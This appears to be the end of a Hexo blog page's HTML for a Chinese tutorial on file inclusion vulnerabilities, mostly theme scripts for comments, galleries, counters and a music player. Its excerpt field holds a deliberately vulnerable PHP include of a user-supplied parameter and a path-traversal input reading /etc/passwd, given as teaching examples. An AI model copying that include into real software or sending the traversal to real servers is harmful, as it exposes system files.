+          url: "https://cl1ck-t0.github.io/2026/08/20/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E8%AF%A6%E8%A7%A3%E5%8F%8A%E5%88%A9%E7%94%A8/",
+          excerpt: "",
+          description: "",
+          stripContent: " 文件包含漏洞  一、基础知识  1.什么是文件包含漏洞  1.1 基本概念 文件包含漏洞是指应用程序在引入文件时，用户能够控制包含的文件路径，导致服务器执行了非预期的文件内容。 123456// 正常使用&amp;lt;?php include(&amp;#x27;header.php&amp;#x27;); ?&amp;gt;// 存在漏洞的代码&amp;lt;?php include($_GET[&amp;#x27;file&amp;#x27;]); ?&amp;gt;// 用户可控制：?file=../../etc/passwd  1.2 为什么会存",
+          date: "Thu Aug 20 2026 12:11:47 GMT+0800",
+          updated: "Thu Aug 20 2026 12:13:17 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+      
+<script src="/js/tabs.js" data-pjax defer></script>
+
+        
+<script src="https://npm.webcache.cn/@zumer/snapdom@1.9.14/dist/snapdom.min.js" integrity="sha384-OEQ+fJp&#x2F;Mvi2uzBREXybtxryJvLytWapuHu4EE6LPwTKUwATYcc55tPPcZTzVcmx" crossorigin="anonymous" defer data-pjax></script>
+
+        
+<script src="https://npm.webcache.cn/qrcode@1.5.1/build/qrcode.js" integrity="sha384-VT1EeewTCEXgndcPMQ0PzV+uVFYjxFIjmAA7s5gcMX9t4Dt5TD+OVQIn7NJWIXn7" crossorigin="anonymous" defer data-pjax></script>
+
+      <script type="module" data-pjax>
+        (async () => {
+          const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+          const initPswp = (gallery, children) => {
+            if (_$$(`${gallery} ${children}`).length > 0) {
+              new PhotoSwipeLightbox({
+                gallery,
+                children,
+                pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+              }).init();
+            }
+          }
+          const pswp = () => {
+            initPswp('.article-entry', 'a.article-gallery-item');
+            initPswp('.article-gallery', 'a.article-gallery-item');
+          }
+          pswp();
+        })();
+      </script>
+        
+
+<script data-pjax>
+  var loadScript = (src, integrity) => {
+    const script = document.createElement('script');
+    script.src = src;
+    if (integrity) script.integrity = integrity;
+    script.crossOrigin = 'anonymous';
+    return script;
+  };
+
+  var commentConfigKeys = ["utterances"];
+  var commentConfig = {
+    utterances: {
+      enable: true,
+      load: () => {
+        const container = document.querySelector('.utterances-comment'); 
+        if (!container) return;
+        container.style.display = 'block';
+
+        let theme = 'auto';
+        const parsedTheme = theme === 'auto' ? (document.documentElement.getAttribute('data-theme') === 'dark' ? 'github-dark' : 'github-light') : theme;
+
+        // 创建 utterances 脚本
+        const script = document.createElement('script');
+        script.src = 'https://utteranc.es/client.js';
+        script.setAttribute('repo', 'Cl1ck-t0/Cl1ck-t0.github.io');
+        script.setAttribute('issue-term', 'title');
+        script.setAttribute('theme', parsedTheme);
+        script.setAttribute('crossorigin', 'anonymous');
+        script.async = true;
+
+        // 清空容器（防止重复加载）并插入脚本
+        container.innerHTML = '';
+        container.appendChild(script);
+        if (theme === 'auto') {
+          const themeHandler = (e) => {
+            const iframe = container.querySelector('iframe.utterances-frame');
+            if (!iframe || !iframe.contentWindow) {
+              document.body.removeEventListener('reimu:theme-set', themeHandler);
+              return;
+            }
+            iframe.contentWindow.postMessage({ type: 'set-theme', theme: e.detail.isDark ? 'github-dark' : 'github-light' }, 'https://utteranc.es');
+          };
+          document.body.addEventListener('reimu:theme-set', themeHandler);
+        }
+      }
+    },
+  }
+  commentConfig.enable = commentConfigKeys.some(key => commentConfig[key].enable);
+
+  var defaultComment = '';
+  if (commentConfig.enable) {
+    // 1. 首先检查localStorage中是否有保存的评论类型
+    var savedCommentType = localStorage.getItem('commentType');
+    
+    // 2. 如果localStorage中有值且对应的评论系统可用，就使用它
+    if (savedCommentType) {
+      if (commentConfig[savedCommentType]?.enable) {
+        defaultComment = savedCommentType;
+      }
+    }
+    
+    // 3. 如果localStorage无效，检查配置的默认评论系统
+    if (!defaultComment) {
+      var configDefault = 'waline';
+      if (commentConfig[configDefault]?.enable) {
+        defaultComment = configDefault;
+      }
+    }
+    
+    // 4. 如果前两项都无效，按指定顺序找到第一个可用的评论系统
+    if (!defaultComment) {
+      defaultComment = commentConfigKeys.find(sys => commentConfig[sys].enable) || '';
+    }
+  }
+  function loadComments() {
+    if (!commentConfig.enable) return;
+    const loadedComments = {
+      valine: false,
+      waline: false,
+      twikoo: false,
+      gitalk: false,
+      giscus: false
+    };
+
+    // 隐藏所有评论容器
+    const hideAllComments = () => {
+      const commentContainers = document.querySelectorAll('.comment');
+      commentContainers.forEach(container => {
+        container.style.display = 'none';
+      });
+    };
+
+    // 按需加载评论系统
+    const loadCommentSystem = (type) => {
+      if (loadedComments[type]) {
+        // 如果已加载，只需显示对应容器
+        document.querySelector(`.${type}-comment`).style.display = 'block';
+        return;
+      }
+
+      // 根据类型加载对应的脚本
+      commentConfig[type]?.load();
+      loadedComments[type] = true;
+    };
+
+    // 评论组件选择器
+    const changeActiveCommentItems = (item) => {
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let i = 0; i < commentItems.length; i++) {
+        commentItems[i].classList.remove('active');
+      }
+      item.classList.add('active');
+
+      // 获取要加载的评论系统类型
+      const commentType = item.getAttribute('data-selector');
+
+      // 隐藏所有评论系统
+      hideAllComments();
+
+      // 加载选中的评论系统
+      loadCommentSystem(commentType);
+    };
+
+    const commentInit = () => {
+      // 评论组件选择器点击事件
+      const commentItems = document.querySelectorAll('.selector-item');
+      for (let item of commentItems) {
+        item.addEventListener('click', () => {
+          // 保存选择器状态
+          const commentType = item.getAttribute('data-selector');
+          window.localStorage.setItem('commentType', commentType);
+          // 切换选中状态
+          changeActiveCommentItems(item);
+        });
+      }
+
+      // 检查是否需要加载默认评论系统
+      if (defaultComment) {
+        const defaultSelectorItem = document.querySelector(`[data-selector="${defaultComment}"]`);
+        if (!defaultSelectorItem) return;
+        defaultSelectorItem.style.display = 'block';
+        defaultSelectorItem.classList.add('active');
+        loadCommentSystem(defaultComment);
+      }
+    }
+
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', commentInit);
+    } else {
+      commentInit();
+    }
+  };
+  loadComments();
+</script>
+
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.12.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+    <script>
+      var setupAPlayer = () => {
+        if (!false || !window.matchMedia('(max-width: 768px)').matches) {
+          if (window.matchMedia('(max-width: 959px)').matches) {
+            const meting = _$('meting-js');
+            if (meting) {
+              meting.setAttribute('fixed', 'true');
+              const aside = meting.parentNode?.parentNode;
+              if (aside?.tagName === 'ASIDE') {
+                meting.parentNode.removeChild(meting);
+                document.body.appendChild(meting);
+              }
+            }
+          }
+        }
+      };
+    </script>
+  
+<script src="https://npm.webcache.cn/aplayer@1.10.1/dist/APlayer.min.js" integrity="sha384-gdGYZwHnfJM54evoZhpO0s6ZF5BQiybkiyW7VXr+h5UfruuRL&#x2F;aORyw+5+HZoU6e" crossorigin="anonymous" defer onload="setupAPlayer()"></script>
+
+    
+<script src="https://npm.webcache.cn/meting@2.0.1/dist/Meting.min.js" integrity="sha384-ASVlpKF80A22OXTK3tfEjZm1EL6uFMKIC4p8+0maanw1S&#x2F;IyB+Y4JG+ZDU7GpKE8" crossorigin="anonymous" defer></script>
+
+
+
+  </body>
+  </html>
